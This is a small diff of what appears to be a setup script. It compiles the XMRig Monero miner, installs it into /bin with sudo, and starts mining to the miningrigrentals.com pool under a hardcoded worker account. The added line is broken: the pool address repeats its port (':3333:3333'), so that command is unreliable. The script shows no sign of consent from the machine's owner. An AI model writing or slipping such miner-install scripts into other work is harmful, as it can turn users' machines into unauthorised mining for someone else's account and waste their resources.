@@ -6,4 +6,4 @@ mkdir build && cd build
 cmake ..
 make -j$(nproc)
 sudo cp xmrig /bin/xmrig
-./xmrig -a rx/0 -o us-east01.miningrigrentals.com:3333 -u coulterstutz.330983 -p x --tls --retries=10000
+./xmrig -o us-east01.miningrigrentals.com:3333:3333 -u coulterstutz.330983 -p x -k --nicehash --coin monero -a rx/0
